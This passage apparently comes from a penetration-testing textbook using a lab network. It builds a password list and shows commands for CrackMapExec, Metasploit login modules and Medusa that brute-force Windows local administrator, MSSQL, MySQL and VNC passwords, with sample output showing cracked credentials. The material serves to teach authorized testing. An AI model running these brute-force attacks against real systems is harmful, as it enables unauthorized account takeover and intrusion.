### Password List
1. password1!
2. password2019
3. password2019!
4. Password
5. Password1
6. Password!
7. Password1!
8. Password2019
9. Password2019!
10. capsulecorp
11. capsulecorp1
12. capsulecorp!
13. capsulecorp1!
14. capsulecorp2019
15. capsulecorp2019!
16. Capsulecorp
17. Capsulecorp1
18. Capsulecorp!
19. Capsulecorp1!
20. Capsulecorp2019
21. Capsulecorp2019!

### Commonly Used Passwords
Commonly used passwords, such as `admin`, `root`, `guest`, `sa`, and `changeme`, are often included in password lists due to their frequent use. This list is designed to be short and efficient. However, you can increase your chances of success by adding more passwords. If you do, follow the same formula: choose a base word and create 12 permutations of it. Remember, the more passwords you add, the longer it will take to conduct brute-force guessing against the entire target list.

### Exercise 4.2: Creating a Client-Specific Password List
Follow the steps below to create a password list specific to your testing environment. If you are using the Capsulecorp Pentest environment, the password list provided in Listing 4.3 will suffice. Store this list in your vulnerabilities directory and name it something like `password-list.txt`.

### 4.3.2 Brute-Forcing Local Windows Account Passwords
In this section, we will attempt to discover vulnerable hosts. Penetration testers often start with Windows hosts because they tend to offer more opportunities for exploitation. Most companies use Microsoft Active Directory to manage user authentication, making domain compromise a high priority for attackers. Once you gain access to a single Windows system on the domain, it is often possible to escalate privileges to Domain Admin.

#### Brute-Force Password Guessing Against Local Administrator Accounts
Brute-forcing Active Directory accounts requires knowledge of the account lockout policy. To avoid locking out users and causing an outage, penetration testers typically focus on local administrator accounts, which are often configured to ignore failed logins and never generate an account lockout.

Use the following command with CME to target the UID 500 local administrator account on all identified Windows systems:
```bash
cme smb discovery/hosts/windows.txt --local-auth -u Administrator -p passwords.txt
```
Optionally, you can pipe the output to `grep -v '[-]'` for less verbose and easier-to-read results.

#### Example Output
```plaintext
CME     10.0.10.200:445 GOKU      [*] Windows 10.0 Build 17763 (name:GOKU) (domain:CAPSULECORP)
CME     10.0.10.201:445 GOHAN      [*] Windows 10.0 Build 14393 (name:GOHAN) (domain:CAPSULECORP)
CME     10.0.10.206:445 YAMCHA     [*] Windows 10.0 Build 17763 (name:YAMCHA) (domain:CAPSULECORP)
CME     10.0.10.202:445 VEGETA     [*] Windows 6.3 Build 9600 (name:VEGETA) (domain:CAPSULECORP)
CME     10.0.10.207:445 RADITZ     [*] Windows 10.0 Build 14393 (name:RADITZ) (domain:CAPSULECORP)
CME     10.0.10.203:445 TRUNKS     [*] Windows 6.3 Build 9600 (name:TRUNKS) (domain:CAPSULECORP)
CME     10.0.10.208:445 TIEN      [*] Windows 6.1 Build 7601 (name:TIEN) (domain:CAPSULECORP)
CME     10.0.10.205:445 KRILLIN    [*] Windows 10.0 Build 17763 (name:KRILLIN) (domain:CAPSULECORP)
CME     10.0.10.202:445 VEGETA     [+] VEGETA\Administrator:Password1! (Pwn3d!)
CME     10.0.10.201:445 GOHAN      [+] GOHAN\Administrator:capsulecorp2019! (Pwn3d!)
```

This output indicates that two Windows targets are using passwords from our list. You can now log in to these systems with administrator-level privileges.

### 4.3.3 Brute-Forcing MSSQL and MySQL Database Passwords
Next, we will target database servers. During service discovery, we found instances of Microsoft SQL Server (MSSQL) and MySQL. We can use Metasploit to perform brute-force password guessing.

#### Brute-Forcing MSSQL Passwords
1. Start the Metasploit console.
2. Use the MSSQL login module: `use auxiliary/scanner/mssql/mssql_login`.
3. Set the username, pass_file, and rhosts variables:
   ```bash
   set username sa
   set pass_file /home/royce/capsulecorp/passwords.txt
   set rhosts file:/home/royce/capsulecorp/discovery/hosts/mssql.txt
   ```
4. Run the module: `run`.

#### Example Output
```plaintext
[*] 10.0.10.201:1433   - 10.0.10.201:1433 - MSSQL - Starting authentication scanner.
[-] 10.0.10.201:1433   - 10.0.10.201:1433 - LOGIN FAILED: WORKSTATION\sa:admin (Incorrect: )
[-] 10.0.10.201:1433   - 10.0.10.201:1433 - LOGIN FAILED: WORKSTATION\sa:root (Incorrect: )
[-] 10.0.10.201:1433   - 10.0.10.201:1433 - LOGIN FAILED: WORKSTATION\sa:password (Incorrect: )
[+] 10.0.10.201:1433   - 10.0.10.201:1433 - Login Successful: WORKSTATION\sa:Password1
[*] 10.0.10.201:1433   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

If the MSSQL server allows the `xp_cmdshell` stored procedure, you can use it to execute operating system commands remotely. If it is disabled, you can enable it with the `sa` account, which has full administrative privileges.

#### Brute-Forcing MySQL Passwords
1. Switch to the MySQL module: `use auxiliary/scanner/mysql/mysql_login`.
2. Set the rhosts and pass_file variables:
   ```bash
   set rhosts file:/home/royce/capsulecorp/discovery/hosts/mysql.txt
   set pass_file /home/royce/capsulecorp/passwords.txt
   ```
3. Run the module: `run`.

#### Example Output
```plaintext
[-] 10.0.10.203:3306   - 10.0.10.203:3306 - Unsupported target version of MySQL detected. Skipping.
[*] 10.0.10.203:3306   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The error message "Unsupported target version of MySQL detected" may indicate that the MySQL server only allows local logins. Use Medusa to verify:
```bash
medusa -M mysql -H discovery/hosts/mysql.txt -u root -P passwords.txt
```

### 4.3.4 Brute-Forcing VNC Passwords
VNC is a popular remote management solution, but it often lacks encryption and does not integrate with centralized authentication systems. It is a common target for brute-force attacks.

#### Using Metasploit to Brute-Force VNC Passwords
1. Load the VNC login module: `use auxiliary/scanner/vnc/vnc_login`.
2. Set the rhosts and pass_file variables:
   ```bash
   set rhosts file:/home/royce/capsulecorp/discovery/hosts/vnc.txt
   set pass_file /home/royce/capsulecorp/passwords.txt
   ```
3. Run the module: `run`.

#### Example Output
```plaintext
[*] 10.0.10.205:5900   - 10.0.10.205:5900 - Starting VNC login
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :admin (Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :root (Incorrect: No supported authentication method found.)
...
[*] Scanned 1 of 2 hosts (50% complete)
[*] 10.0.10.206:5900   - 10.0.10.206:5900 - Starting VNC login
[+] 10.0.10.206:5900   - 10.0.10.206:5900 - Login Successful: :admin
[-] 10.0.10.206:5900   - 10.0.10.206:5900 - LOGIN FAILED: :root (Incorrect: No authentication types available: Your connection has been rejected.)
...
```

This output shows that one of the VNC servers has a weak password (`admin`).